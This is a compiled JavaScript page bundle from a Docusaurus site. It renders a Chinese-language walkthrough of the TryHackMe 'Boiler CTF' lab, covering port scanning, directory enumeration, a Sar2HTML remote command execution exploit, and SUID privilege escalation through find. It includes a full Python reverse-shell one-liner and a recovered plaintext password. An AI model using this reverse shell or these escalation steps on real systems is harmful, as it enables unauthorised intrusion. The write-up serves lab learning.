"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[8350],{10822:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>r,metadata:()=>o,toc:()=>d});var s=n(74848),i=n(28453);const r={sidebar_position:85,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","SUID"],title:"Boiler CTF",description:"Boiler CTF",sidebar_label:"Boiler CTF",slug:"/tryhackme/85"},a="Boiler CTF",o={id:"box/TryHackMe/85",title:"Boiler CTF",description:"Boiler CTF",source:"@site/docs/box/TryHackMe/85.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/85",permalink:"/docs/tryhackme/85",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"SUID",permalink:"/docs/tags/suid"}],version:"current",sidebarPosition:85,frontMatter:{sidebar_position:85,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","SUID"],title:"Boiler CTF",description:"Boiler CTF",sidebar_label:"Boiler CTF",slug:"/tryhackme/85"},sidebar:"boxSidebar",previous:{title:"dogcat",permalink:"/docs/tryhackme/84"},next:{title:"UltraTech",permalink:"/docs/tryhackme/86"}},l={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"21 - FTP",id:"21---ftp",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; root",id:"www-data--root",level:3},{value:"\u6269\u5c55",id:"\u6269\u5c55",level:2},{value:"www-data \u2014&gt; basterd",id:"www-data--basterd",level:3},{value:"basterd \u2014&gt; stoner",id:"basterd--stoner",level:3}];function c(e){const t={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(t.h1,{id:"boiler-ctf",children:"Boiler CTF"}),"\n",(0,s.jsx)(t.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-168-22:~/boilerctf2# nmap -sTCV -p 21,80,10000,55007 --min-rate 1000 10.10.243.135\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-11 10:43 BST\nNmap scan report for ip-10-10-243-135.eu-west-1.compute.internal (10.10.243.135)\nHost is up (0.00014s latency).\n\nPORT      STATE SERVICE VERSION\n21/tcp    open  ftp     vsftpd 3.0.3\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.168.22\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 5\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-robots.txt: 1 disallowed entry \n|_/\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n10000/tcp open  http    MiniServ 1.930 (Webmin httpd)\n|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).\n55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)\n|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)\n|_  256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (EdDSA)\nMAC Address: 02:D6:EF:FF:CB:5D (Unknown)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 37.22 seconds\n"})}),"\n",(0,s.jsx)(t.h2,{id:"21---ftp",children:"21 - FTP"}),"\n",(0,s.jsxs)(t.p,{children:["\u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u533f\u540d\u5171\u4eab, \u767b\u9646\u540e\u53d1\u73b0\u5176\u4e2d\u6709\u4e00\u4e2a ",(0,s.jsx)(t.code,{children:".info.txt"})," \u4f46\u662f\u6ca1\u6709\u4ec0\u4e48\u7528"]}),"\n",(0,s.jsx)(t.h2,{id:"80",children:"80"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-168-22:~/boilerctf2# gobuster dir -u http://10.10.243.135/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.243.135/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     txt,html,php\n[+] Timeout:        10s\n===============================================================\n2023/09/11 10:45:53 Starting gobuster\n===============================================================\n/index.html (Status: 200)\n/manual (Status: 301)\n/robots.txt (Status: 200)\n/joomla (Status: 301)\n"})}),"\n",(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsxs)(t.li,{children:[(0,s.jsx)(t.code,{children:"/manual"})," : apache \u7684\u9875\u9762"]}),"\n",(0,s.jsxs)(t.li,{children:[(0,s.jsx)(t.code,{children:"/joomla"})," : \u4e00\u4e2a CMS \u4f30\u8ba1\u5c31\u662f\u8fd9\u91cc\u4e86"]}),"\n"]}),"\n",(0,s.jsx)(t.p,{children:"\u8bbf\u95ee joomla  \u9875\u9762, \u8fdb\u884c\u4e86\u76ee\u5f55\u626b\u63cf, \u8fd9\u4e2a\u626b\u63cf\u51fa\u6765\u7684\u7ed3\u679c\u6bd4\u8f83\u591a\u5c31\u8fdb\u884c\u4e86\u7b80\u5316"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"root@ip-10-10-168-22:~/boilerctf2# gobuster dir -u http://10.10.243.135/joomla/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.243.135/joomla/\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Extensions:     php,txt,html\n[+] Timeout:        10s\n===============================================================\n2023/09/11 10:59:03 Starting gobuster\n===============================================================\n/images (Status: 301)\n...\n/tests (Status: 301)\n....\n/_files (Status: 301)\n"})}),"\n",(0,s.jsxs)(t.ul,{children:["\n",(0,s.jsx)(t.li,{children:"/tests : \u8fd9\u91cc\u5217\u51fa\u4e86\u7f51\u7ad9\u7684\u76ee\u5f55"}),"\n"]}),"\n",(0,s.jsxs)(t.p,{children:["\u8fd9\u91cc\u57fa\u672c\u5c31\u65ad\u4e86, \u56e0\u4e3a\u5176\u4e2d\u6700\u4e3b\u8981\u7684\u4e00\u4e2a\u76ee\u5f55 _test \u662f\u4e0d\u5728\u5b57\u5178\u4e2d\u7684, \u5f53\u6211\u4eec\u8bbf\u95ee ",(0,s.jsx)(t.code,{children:"http://10.10.255.110/joomla/_test/"})," \u663e\u793a\u662f\u4e00\u4e2a sar2html \u7ecf\u8fc7\u8c37\u6b4c\u53d1\u73b0\u4e00\u4e2a\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e ",(0,s.jsx)(t.a,{href:"https://www.exploit-db.com/exploits/47204",children:"Sar2HTML 3.2.1 - Remote Command Execution"})]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/sudo.gif",alt:""})}),"\n",(0,s.jsx)(t.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(t.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.168.22",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'\n'})}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703210155.png",alt:"20240703210155"})}),"\n",(0,s.jsx)(t.h3,{id:"www-data--root",children:"www-data \u2014> root"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703210207.png",alt:"20240703210207"})}),"\n",(0,s.jsxs)(t.p,{children:["\u679a\u4e3e SUID \u53d1\u73b0\u4e00\u4e2a ",(0,s.jsx)(t.a,{href:"https://gtfobins.github.io/gtfobins/find/#suid",children:"find#suid"})]}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703210229.png",alt:"20240703210229"})}),"\n",(0,s.jsx)(t.h2,{id:"\u6269\u5c55",children:"\u6269\u5c55"}),"\n",(0,s.jsx)(t.h3,{id:"www-data--basterd",children:"www-data \u2014> basterd"}),"\n",(0,s.jsx)(t.p,{children:"\u5728\u6211\u4eec\u7684\u7f51\u7ad9\u76ee\u5f55\u4e2d\u53ef\u4ee5\u627e\u5230\u4e00\u4e2a log.txt \u5728\u5176\u4e2d\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u5bc6\u7801"}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703210247.png",alt:"20240703210247"})}),"\n",(0,s.jsx)(t.h3,{id:"basterd--stoner",children:"basterd \u2014> stoner"}),"\n",(0,s.jsxs)(t.p,{children:["\u5728\u7528\u6237 basyerd \u4e2d\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a ",(0,s.jsx)(t.code,{children:"backup.sh"})," \u6587\u4ef6, \u5176\u4e2d\u5b58\u5728 stoner \u7528\u6237\u7684\u5bc6\u7801"]}),"\n",(0,s.jsx)(t.pre,{children:(0,s.jsx)(t.code,{className:"language-bash",children:"basterd@Vulnerable:~$ ls\nbackup.sh\n\nbasterd@Vulnerable:~$ cat backup.sh \n.....\nUSER=stoner\n#superduperp@$$no1knows\n"})}),"\n",(0,s.jsx)(t.p,{children:(0,s.jsx)(t.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703210309.png",alt:"20240703210309"})}),"\n",(0,s.jsx)(t.p,{children:"\u867d\u7136\u7531 SUDO\u7279\u6743\u4f46\u662f\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5e76\u4e0d\u5b58\u5728, \u6240\u4ee5\u8fd8\u662f\u4f1a\u56de\u5230 SUID"})]})}function h(e={}){const{wrapper:t}={...(0,i.R)(),...e.components};return t?(0,s.jsx)(t,{...e,children:(0,s.jsx)(c,{...e})}):c(e)}},28453:(e,t,n)=>{n.d(t,{R:()=>a,x:()=>o});var s=n(96540);const i={},r=s.createContext(i);function a(e){const t=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function o(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),s.createElement(r.Provider,{value:t},e.children)}}}]);